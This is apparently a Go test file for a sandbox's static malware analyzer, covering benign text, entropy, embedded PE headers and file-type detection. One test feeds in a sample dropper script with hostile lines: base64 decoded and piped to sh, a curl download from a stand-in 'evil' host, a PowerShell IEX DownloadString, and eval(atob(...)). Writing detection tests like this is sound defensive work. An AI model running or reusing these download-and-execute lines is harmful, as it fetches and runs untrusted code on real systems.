package sandbox

import (
	"bytes"
	"strings"
	"testing"
)

func TestAnalyzeStatic_BenignText(t *testing.T) {
	v := AnalyzeStatic("readme.txt", []byte("Hello world.\nThis is a normal text file with nothing suspicious."))
	if v.Verdict != "benign" {
		t.Errorf("verdict = %q, want benign (score=%d, reasons=%v)", v.Verdict, v.Score, v.Reasons)
	}
	if v.FileType != "script" { // mostly-text classified as script-ish
		t.Errorf("file_type = %q", v.FileType)
	}
	if v.SHA256 == "" || v.Size == 0 {
		t.Error("expected hash and size")
	}
}

func TestAnalyzeStatic_ObfuscatedScript(t *testing.T) {
	payload := "#!/bin/sh\n" +
		"echo aWQK | base64 -d | sh\n" +
		"curl http://evil.example.com/x -o /tmp/x\n" +
		"IEX (New-Object Net.WebClient).DownloadString('http://bad.example.org/p')\n" +
		"eval(atob('...'))\n"
	v := AnalyzeStatic("dropper.sh", []byte(payload))
	if v.Verdict == "benign" {
		t.Errorf("expected suspicious/malicious for obfuscated script, got benign (score=%d)", v.Score)
	}
	if len(v.URLs) < 2 {
		t.Errorf("expected embedded URLs extracted, got %v", v.URLs)
	}
}

func TestAnalyzeStatic_HighEntropy(t *testing.T) {
	// A high-entropy blob (simulated packed/encrypted content).
	data := make([]byte, 8192)
	for i := range data {
		data[i] = byte((i*167 + 13) % 256) // near-uniform distribution → high entropy
	}
	v := AnalyzeStatic("packed.bin", data)
	if v.Entropy < 7.0 {
		t.Errorf("entropy = %.2f, expected high", v.Entropy)
	}
	found := false
	for _, r := range v.Reasons {
		if strings.Contains(r, "エントロピー") {
			found = true
		}
	}
	if !found {
		t.Errorf("expected high-entropy reason, got %v", v.Reasons)
	}
}

func TestAnalyzeStatic_EmbeddedPE(t *testing.T) {
	// A non-PE file with an embedded MZ header further in (dropper pattern).
	data := append([]byte("harmless prefix data ....."), append([]byte{0x4D, 0x5A}, bytes.Repeat([]byte{0x00}, 64)...)...)
	v := AnalyzeStatic("carrier.dat", data)
	found := false
	for _, r := range v.Reasons {
		if strings.Contains(r, "埋め込まれた PE") {
			found = true
		}
	}
	if !found {
		t.Errorf("expected embedded-PE reason, got %v (score=%d)", v.Reasons, v.Score)
	}
}

func TestDetectFileType(t *testing.T) {
	cases := []struct {
		data []byte
		want string
	}{
		{[]byte{0x4D, 0x5A, 0x90}, "pe"},
		{[]byte{0x7F, 'E', 'L', 'F'}, "elf"},
		{[]byte("#!/bin/bash\n"), "script"},
		{[]byte{'P', 'K', 0x03, 0x04}, "archive"},
		{[]byte("%PDF-1.7"), "document"},
	}
	for _, c := range cases {
		if got := detectFileType(c.data); got != c.want {
			t.Errorf("detectFileType(%v) = %q, want %q", c.data[:min(4, len(c.data))], got, c.want)
		}
	}
}
